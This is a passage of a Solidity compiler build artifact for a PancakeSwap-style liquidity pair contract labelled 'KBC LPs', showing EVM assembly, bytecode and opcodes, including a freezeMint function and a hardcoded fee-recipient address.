\"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2016:2031  totalSupply.add */\n      tag_348\n        /* \"src/ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"src/ERC20.sol\":2002:2013  totalSupply */\n      0x00\n        /* \"src/ERC20.sol\":2002:2039  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2075:2098  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2075:2089  _frozenBalance */\n      0x03\n        /* \"src/ERC20.sol\":2075:2098  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      tag_391\n      swap1\n        /* \"src/ERC20.sol\":2103:2109  amount */\n      dup4\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2075:2102  _frozenBalance[account].add */\n      tag_348\n        /* \"src/ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2049:2063  _frozenBalance */\n      0x03\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":2049:2110  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/ERC20.sol\":2049:2072  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"src/ERC20.sol\":2179:2183  true */\n      0x01\n        /* \"src/ERC20.sol\":1714:2190  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_340:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":396:406  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"src/UQ112x112.sol\":396:413  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"src/UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"src/UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_341:\n        /* \"src/UQ112x112.sol\":567:576  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":596:606  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/UQ112x112.sol\":592:606  x / uint224(y) */\n      dup5\n      and\n        /* \"src/UQ112x112.sol\":596:606  uint224(y) */\n      dup2\n        /* \"src/UQ112x112.sol\":592:606  x / uint224(y) */\n      tag_394\n      jumpi\n      invalid\n    tag_394:\n      div\n      swap4\n        /* \"src/UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_348:\n        /* \"src/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600680546001600160a01b031916739e94ee69f3cdcd5e74e05563736e4679da6db44c1790556001600f5534801561003b57600080fd5b50604051469080605261280f82396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031916331790556126ea806101256000396000f3fe608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f928492879261160392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122dd576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x9E94EE69F3CDCD5E74E05563736E4679DA6DB44C OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0xF SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x280F DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE PUSH2 0x26EA DUP1 PUSH2 0x125 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ 